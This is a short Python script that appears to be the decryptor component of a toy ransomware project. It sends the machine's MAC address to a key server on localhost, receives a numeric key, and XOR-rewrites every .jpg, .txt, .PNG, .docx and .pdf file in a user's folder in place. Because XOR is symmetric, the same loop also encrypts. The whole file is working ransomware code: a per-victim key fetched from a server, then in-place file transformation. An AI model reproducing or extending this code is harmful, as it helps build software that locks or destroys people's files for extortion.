import requests
import re, uuid
import os

url='http://127.0.0.1:9000'
directory='C:/Users/teama/Desktop/NW/files'
def decrypt(key):
    for filename in os.listdir(directory):
        if filename.endswith(".jpg") or filename.endswith(".txt") or  filename.endswith(".PNG") or filename.endswith(".docx") or filename.endswith(".pdf"):
            f=os.path.join(directory, filename)
            file= open(f,"rb")
            read_file=file.read()
            read_bytes=bytearray(read_file)
            print(len(read_bytes))
            print(os.path.join(directory, filename))
            print("FILE DECRYPTED...")

            for index,value in enumerate(read_bytes):
                read_bytes[index]=value^key

            file.close()

            file=open(f,"wb")
            file.write(read_bytes)
            file.close()
        else:
            continue


def getKey():
    macid=''.join(re.findall('..', '%012x' % uuid.getnode()))
    cid={'macid':macid}
    x=requests.get(url,data=cid)
    print(x.text)
    key=int(x.text)
    return key

key=getKey()

print('decrypting in process')
decrypt(key)
